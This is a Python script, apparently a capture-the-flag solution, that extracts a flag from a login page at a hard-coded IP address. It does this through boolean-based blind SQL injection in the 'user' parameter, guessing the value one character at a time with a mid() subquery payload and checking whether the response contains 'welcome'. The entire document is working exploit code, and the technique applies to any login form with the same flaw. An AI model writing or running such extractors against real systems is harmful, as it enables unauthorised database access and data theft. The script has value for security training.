import requests
import string

def extract_flag():
    base_url = "http://15.237.112.58:8087/"
    flag = ""
    chars = string.printable
    
    print(" Starting flag extraction...")
    print("=" * 50)
    
    for position in range(1, 100):
        found_char = False
        
        for char in chars:
            # Construire la payload SQL injection
            payload = f"'OR(mid((select(flag)from(flag)),{position},1))='{char}'OR'a" 
            
            params = {
                'user': payload,
                'pass': 'test'
            }
            
            try:
                response = requests.get(base_url, params=params, timeout=5)
                
                if "welcome" in response.text.lower():
                    flag += char
                    print(f" Position {position:2d}: '{char}' : {flag}")
                    found_char = True
                    break
                    
            except requests.RequestException as e:
                print(f" Error: {e}")
                continue
        
        # Si aucun caractère trouvé à cette position
        if not found_char:
            print(f" No character at position {position}")
            print(f" Final flag: {flag}")
            
            # Vérifier si le flag est complet
            if flag.endswith('}'):
                print("Flag appears complete!")
            break
        
        # Arrêter si le flag est complet
        if flag.endswith('}'):
            print("=" * 50)
            print(f" FLAG EXTRACTED SUCCESSFULLY: {flag}")
            break
    
    return flag

if __name__ == "__main__":
    flag = extract_flag()